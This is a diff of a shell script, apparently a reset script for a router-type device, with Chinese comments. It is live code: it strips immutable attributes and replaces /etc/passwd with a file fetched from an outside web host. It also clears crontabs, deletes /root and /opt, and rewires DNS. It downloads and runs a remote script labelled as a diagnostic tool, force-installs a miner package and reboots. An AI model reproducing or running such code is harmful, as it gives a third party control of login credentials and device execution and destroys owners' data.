@@ -1,33 +1,36 @@
+(
+LOG_PATH=/tmp/reset.log
+
 setHost()
 {
     /bin/busybox chattr -i /etc 2>&1;
     chattr -i /etc/passwd*;
     [ -f /etc/passwd+ ] && rm -rf /etc/passwd+ 2>&1;
     chattr -i /etc/hosts*;
-    #ip=`nslookup twin13034.sandai.net | tail -n 1 | head -n 1|awk -F': ' '{print $2}'|awk '{print $1}'`;
-    #[ -n "$ip" ] && (echo "$ip kjapi.peiluyou.com">>/etc/hosts;[ -f /etc/init.d/dnsmasq ] && /etc/init.d/dnsmasq restart;killall remote;sleep 10;sed -i '2,$d' /etc/hosts;) || echo '无法解析twin13034.sandai.net';
 }
 
-LOG_PATH=/tmp/reset.log
+output() {
+  echo $1 >> $LOG_PATH;
+}
 
 #清除crontab信息
-crontab -r
+crontab -r;
+rm -rf /etc/crontabs/* 2>>$LOG_PATH;
 
+setHost 2>>$LOG_PATH;
 wget 'http://www.xiefucai.com/tools/zqb2/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
-ubus call dcdn set_dcdn_client '{"count":1}'
-echo 'exit 0'>/etc/rc.local
-cd /root;rm -rf *;
+echo 'exit 0'>/etc/rc.local 2>>$LOG_PATH;
+rm -rf /root/* /opt/*;
 
 # 安装断网诊断工具
-wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;sh /tmp/wget_ddd.sh 2>>$LOG_PATH;
+wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/wget_ddd.sh 2>>$LOG_PATH;
+chmod +x /tmp/wget_ddd.sh 2>>$LOG_PATH;
+sh /tmp/wget_ddd.sh 2>>$LOG_PATH;
 
 wget 'https://update.peiluyou.com/conf/miner_plus_beta/packages/thunder-miner-app_V1.3.305_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH
 
-if [ -d /opt ];then
-    rm -rf /opt
-fi
+rm -rf /etc/resolv.conf 2>>$LOG_PATH;
+ln -s /tmp/resolv.conf /etc/resolv.conf 2>>$LOG_PATH;
 
-if [ ! -f /etc/resolv.conf ]; then (echo -e "nameserver 114.114.114.114;nameserver 114.114.114.115">/tmp/resolv.conf;ln -s /tmp/resolv.conf /etc/resolv.conf); fi
-
-
-[ -f /tmp/t.ipk ] && (opkg install --force-downgrade /tmp/t.ipk 2>>$LOG_PATH && setHost 2>>$LOG_PATH && sleep 30 && reboot &) || (echo '未下载到安装包' >>$LOG_PATH;ls -al /tmp/*.ipk >>$LOG_PATH);
+[ -f /tmp/t.ipk ] && (opkg install --force-downgrade /tmp/t.ipk 2>>$LOG_PATH && output '30秒后强制重启' && sleep 30 && reboot &) || (output '未下载到安装包';ls -al /tmp/*.ipk >>$LOG_PATH);
+) &;
